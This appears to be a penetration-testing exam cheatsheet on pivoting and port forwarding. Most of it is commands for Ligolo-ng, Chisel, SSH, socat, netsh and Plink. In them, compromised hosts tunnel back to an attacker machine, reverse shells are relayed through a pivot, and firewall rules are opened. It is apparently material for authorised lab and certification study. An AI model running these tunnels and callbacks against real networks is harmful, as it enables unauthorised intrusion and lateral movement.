# Pivoting and Port Forwarding - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Pivoting and Tunneling Methodology: [[06-Pivoting-Directory|06 - Pivoting Methodology]]
> - Active Directory Methodology: [[05-Active-Directory|05 - Active Directory Methodology]]
> - Shells and Payloads Cheatsheet: [[🐢 reverse-shells]]
> - Linux Commands Cheatsheet: [[🐧 linux-commands]]
> - Windows Commands Cheatsheet: [[🪟 windows-commands]]

---

## Navigation Triage Matrix

| Operational Goal | Tool / Technique | Quick Link |
|---|---|---|
| Transparent routing without proxychains (AD pivot) | Ligolo-ng (Primary) | [[#1. Ligolo-ng (Primary Pivoting Tool)]] |
| Receive reverse shells back from internal networks | Ligolo-ng Listeners | [[#2. Ligolo-ng Reverse Port Forwarding (Listeners)]] |
| Multi-hop routing through dual compromised hosts | Ligolo-ng Double Pivot | [[#3. Ligolo-ng Double Pivot (Multi-Hop)]] |
| Forward internal localhost port to Kali via SSH | SSH Local Port Forwarding | [[#4. SSH Local Port Forwarding (ssh -L)]] |
| Forward ports on Linux pivot without SSH access | Socat Port Forwarding | [[#5. Socat Port Forwarding]] |
| Route whole subnets over SSH without root on pivot | sshuttle VPN over SSH | [[#6. sshuttle (VPN-like Tunnel over SSH)]] |
| Native Windows port forwarding without uploads | Netsh portproxy | [[#7. Netsh portproxy (Native Windows Forwarding)]] |
| SOCKS5 proxy fallback when Ligolo is blocked | Chisel SOCKS5 Proxy | [[#8. Chisel SOCKS5 Proxy (Backup Solution)]] |
| Chisel single-port forward and Proxychains tuning | Chisel Port Forwarding | [[#9. Chisel Single Port Forward and Proxychains]] |
| Reverse port forwarding through inbound firewalls | SSH Remote Forwarding | [[#10. SSH Remote Port Forwarding (ssh -R)]] |
| Dynamic SOCKS proxy via SSH | SSH Dynamic Forwarding | [[#11. SSH Dynamic Port Forwarding (ssh -D)]] |
| Legacy Windows pivoting with Plink | Plink Legacy Forwarding | [[#12. Plink Forwarding (Legacy Windows)]] |
| High-yield tool selection matrix and cheat block | Quick Reference | [[#13. Quick Reference Cheat Sheet]] |

---

## 1. Ligolo-ng (Primary Pivoting Tool)

Ligolo-ng establishes a virtual TUN interface on your Kali machine. All standard penetration testing tools (`nmap`, `crackmapexec` / `nxc`, `impacket`, `evil-winrm`, `kerbrute`) communicate transparently with internal subnets without requiring `proxychains`.

### Step 1: Initial Setup on Kali Linux (Run Once)
```bash
# 1. Create dedicated TUN interface for current user
sudo ip tuntap add user $(whoami) mode tun ligolo

# 2. Bring interface online
sudo ip link set ligolo up

# 3. Launch Ligolo proxy listener on Kali
./proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8081
```

### Step 2: Connect Agent from Compromised Pivot Host
Transfer the pre-compiled `agent` binary to the pivot machine:

```bash
# Linux Pivot:
chmod +x agent-linux
./agent-linux -connect [KALI_IP]:11601 -ignore-cert

# Windows Pivot (PowerShell):
.\agent-windows.exe -connect [KALI_IP]:11601 -ignore-cert

# If an agent hangs or encounters an error on Windows:
# Stop-Process -Name "agent-windows" -Force
```

### Step 3: Route Subnet on Kali and Activate Session
Inside the interactive Ligolo proxy terminal (`ligolo-ng >>`):

```text
ligolo-ng >> session
# Select the active session (e.g., [1] user@PIVOT)

ligolo-ng (user@PIVOT) >> ifconfig
# Review network interfaces to identify internal subnet (e.g., 10.10.10.0/24)
```

In a separate Kali root terminal, add the routing rule:
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Return to the Ligolo proxy console and start tunnel routing:
```text
ligolo-ng (user@PIVOT) >> start
# [INFO] Starting tunnel to session [1]...
```

> 💡 **Immediate Result**: You can now directly scan or attack internal IPs (`10.10.10.x`) directly from Kali tools:
> ```bash
> nmap -sC -sV -Pn -n 10.10.10.5
> evil-winrm -i 10.10.10.5 -u Administrator -p 'Password123!'
> ```

### Step 4: Cleanup when Finished
```bash
sudo ip route del 10.10.10.0/24 dev ligolo
sudo ip link delete ligolo
```

---

## 2. Ligolo-ng Reverse Port Forwarding (Listeners)

When exploiting an internal machine that cannot reach your Kali IP directly, route callbacks through the pivot host back to Kali.

### Creating a Listener in Ligolo Proxy
Inside the active session in Ligolo:
```text
ligolo-ng (user@PIVOT) >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
- **How it Works**: The pivot host opens port `4444` on all its interfaces.
- Any payload on an internal target configured to callback to `[PIVOT_INTERNAL_IP]:4444` is redirected across the TUN tunnel directly to `127.0.0.1:4444` on Kali.
- Start standard Netcat listener on Kali:
  ```bash
  nc -lvnp 4444
  ```

---

## 3. Ligolo-ng Double Pivot (Multi-Hop)

When encountering a second internal subnet accessible only through an internal compromised host (Pivot 2):

```text
[Kali] <=== TUN ===> [Pivot 1] <=== Subnet A ===> [Pivot 2] <=== Subnet B ===> [Target]
```

1. **Add listener on Pivot 1 to forward agent traffic to Kali**:
   ```text
   ligolo-ng (session 1) >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
2. **Execute agent on Pivot 2 connecting to Pivot 1**:
   ```bash
   ./agent -connect [PIVOT1_INTERNAL_IP]:11601 -ignore-cert
   ```
3. **Handle new session in Ligolo console**:
   ```text
   ligolo-ng >> session
   # Select new session [2]
   ```
4. **Add route on Kali for Subnet B**:
   ```bash
   sudo ip route add 172.16.10.0/24 dev ligolo
   ```
5. **Start routing on Session 2**:
   ```text
   ligolo-ng (session 2) >> start
   ```

---

## 4. SSH Local Port Forwarding (ssh -L)

Brings a remote port hosted on the target machine (or an internal service reachable by the target) to a local port on Kali.

### Localhost Service Forwarding
When `ss -tulpn` or `netstat -ano` reveals a hidden internal service bound to `127.0.0.1:8080` (e.g., Tomcat, Jenkins, database):
```bash
# Forward remote 127.0.0.1:8080 to local Kali port 8080
ssh -N -L 8080:127.0.0.1:8080 [USER]@[PIVOT_IP]
```
Access via Kali browser: `http://127.0.0.1:8080`

### Pivoted Internal Host Forwarding
When the pivot machine can reach a service on an internal host (`[INTERNAL_IP]:445`):
```bash
# Forward internal host SMB port to Kali port 4455
ssh -N -L 0.0.0.0:4455:[INTERNAL_IP]:445 [USER]@[PIVOT_IP]
```
Connect from Kali:
```bash
smbclient //127.0.0.1/share -p 4455 -U [USER]
```

> 💡 **Flag Reference**: `-N` prevents spawning a remote interactive shell (keeps tunnel open), `-f` sends the process to the background.

---

## 5. Socat Port Forwarding

Socat operates as a standalone bidirectional data relay. Ideal when root or admin access is available on a Linux pivot host without SSH keys.

### Local Port Forward (Kali to Internal Target)
Listen on pivot port `8080` and forward all traffic to internal host `[INTERNAL_IP]:80`:
```bash
# Execute on Linux pivot host
socat -ddd TCP-LISTEN:8080,fork,reuseaddr TCP:[INTERNAL_IP]:80
```
Access from Kali: `curl http://[PIVOT_IP]:8080`

### Reverse Port Forward (Internal Target Callback to Kali)
Listen on pivot port `4444` and relay incoming reverse shells to Kali port `4444`:
```bash
# Execute on Linux pivot host
socat -ddd TCP-LISTEN:4444,fork,reuseaddr TCP:[KALI_IP]:4444
```
Payload on internal target connects to `[PIVOT_INTERNAL_IP]:4444`.

---

## 6. sshuttle (VPN-like Tunnel over SSH)

`sshuttle` creates a pseudo-VPN over a standard SSH connection using iptables NAT rules on Kali. It requires Python on the remote machine but **does not require root** on the remote machine.

```bash
# Route entire internal subnet via pivot host
sshuttle -r [USER]@[PIVOT_IP] 10.10.10.0/24 -x [PIVOT_IP]

# With specific SSH key
sshuttle --ssh-cmd "ssh -i id_rsa" -r [USER]@[PIVOT_IP] 10.10.10.0/24
```
All TCP traffic to `10.10.10.0/24` is now forwarded through the SSH tunnel automatically.

---

## 7. Netsh portproxy (Native Windows Forwarding)

Windows provides a native port proxying utility that requires **no external binaries or file uploads**. Requires an elevated (Administrator) shell on the Windows pivot.

### Add Inbound to Internal Port Forwarding Rule
```cmd
:: Forward external port 2222 on Windows pivot to internal host port 22
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=[PIVOT_IP] connectport=22 connectaddress=[INTERNAL_IP]

:: Open Windows Defender firewall for incoming port
netsh advfirewall firewall add rule name="PortProxy_2222" protocol=TCP dir=in localip=[PIVOT_IP] localport=2222 action=allow
```

### Inspect and Verify Active Port Proxies
```cmd
netsh interface portproxy show all
```

### Delete and Cleanup Port Proxy Rules
```cmd
netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=[PIVOT_IP]
netsh advfirewall firewall delete rule name="PortProxy_2222"
```

---

## 8. Chisel SOCKS5 Proxy (Backup Solution)

Use Chisel when Ligolo-ng binaries are blocked by host-based security or when a simple SOCKS5 proxy is specifically required.

### Server on Kali Linux
```bash
# Launch Chisel reverse server listening on port 8000
./chisel server -p 8000 --reverse
```

### Client on Compromised Target
```bash
# Linux Target (Reverse SOCKS proxy to Kali port 1080)
./chisel client [KALI_IP]:8000 R:socks > /dev/null 2>&1 &

# Windows Target (PowerShell)
.\chisel.exe client [KALI_IP]:8000 R:socks
```

### Configure Proxychains on Kali
Edit `/etc/proxychains4.conf`:
```ini
[ProxyList]
socks5 127.0.0.1 1080
```

Run commands through proxy:
```bash
proxychains -q nmap -sT -Pn -n -p 22,80,445,3389 [INTERNAL_IP]
proxychains -q evil-winrm -i [INTERNAL_IP] -u [USER] -p '[PASS]'
```

> ⚠️ **Proxychains Scanning Constraints**:
> - Must use **TCP Connect Scan**: `nmap -sT` (raw SYN `-sS` packets will fail over SOCKS).
> - Must use **No Ping**: `-Pn` (ICMP ping is not routable through SOCKS).
> - Must use **No DNS**: `-n` (prevents external DNS leaks).

---

## 9. Chisel Single Port Forward and Proxychains

### Single Dedicated Port Forward via Chisel
When you only need a single service forwarded without proxychains overhead (e.g., RDP or web console):
```bash
# Execute on target machine:
.\chisel.exe client [KALI_IP]:8000 R:3389:[INTERNAL_IP]:3389
```
Access directly on Kali:
```bash
xfreerdp /v:127.0.0.1:3389 /u:[USER] /p:'[PASS]'
```

### Optimizing proxychains4.conf
To avoid hanging and timeouts during multi-hop scans:
```ini
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

---

## 10. SSH Remote Port Forwarding (ssh -R)

Used when the target machine is behind a restrictive firewall that blocks inbound connections but allows outbound SSH connections.

### Setup on Target
1. Ensure SSH server is active on Kali:
   ```bash
   sudo systemctl start ssh
   ```
2. Execute remote forward on the compromised pivot host:
   ```bash
   # Forward internal service (10.10.10.50:5432) to Kali localhost:5432
   ssh -N -R 127.0.0.1:5432:10.10.10.50:5432 kali@[KALI_IP]
   ```
3. Connect from Kali:
   ```bash
   psql -h 127.0.0.1 -p 5432 -U postgres
   ```

---

## 11. SSH Dynamic Port Forwarding (ssh -D)

Creates a local SOCKS5 proxy server directly using an SSH session without uploading any binaries.

```bash
# Start SOCKS5 proxy on Kali port 9050
ssh -N -D 127.0.0.1:9050 [USER]@[PIVOT_IP]
```
Configure `/etc/proxychains4.conf`:
```ini
[ProxyList]
socks5 127.0.0.1 9050
```

### Windows 10+ Native OpenSSH Dynamic Forwarding
Modern Windows includes `ssh.exe` in `System32`:
```cmd
:: From Windows pivot back to Kali SSH server (Remote SOCKS)
C:\Windows\System32\OpenSSH\ssh.exe -N -R 9998 kali@[KALI_IP]
```

---

## 12. Plink Forwarding (Legacy Windows)

For legacy Windows targets (Windows 7 / Server 2008) lacking native `ssh.exe`:

```cmd
:: Forward internal RDP port to Kali port 9833
C:\Temp\plink.exe -ssh -l kali -pw kalipassword -R 127.0.0.1:9833:[INTERNAL_IP]:3389 [KALI_IP]
```
Connect via Kali:
```bash
xfreerdp /v:127.0.0.1:9833 /u:[USER]
```

---

## 13. Quick Reference Cheat Sheet

### Pivoting Tool Selection Strategy

| Scenario | Recommended Tool | Why |
|---|---|---|
| **Active Directory Internal Network** | **Ligolo-ng** | Native TUN interface; tools run without proxychains |
| **Localhost Service on Standalone Target**| **SSH -L** | Fast, simple, reliable local port forward |
| **Standalone Linux Pivot (No SSH)** | **Socat** | Native Linux binary; instant 1-to-1 port relay |
| **Standalone Windows Pivot (Elevated)** | **Netsh portproxy** | Built-in Windows command; zero files dropped to disk |
| **Ligolo Blocked by Host Defenses** | **Chisel** | SOCKS5 fallback; robust over HTTP/WebSockets |
| **Egress Only Allowed (Inbound Blocked)**| **SSH -R** | Establishes tunnel from target out to Kali |

### Essential Ligolo Quick-Fire Commands
```bash
# 1. Kali Setup
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. Pivot Agent
./agent-linux -connect [KALI_IP]:11601 -ignore-cert
.\agent-windows.exe -connect [KALI_IP]:11601 -ignore-cert

# 3. Route Subnet (Kali Terminal)
sudo ip route add [INTERNAL_SUBNET] dev ligolo

# 4. Activate in Ligolo Console
# session -> 1 -> start
```
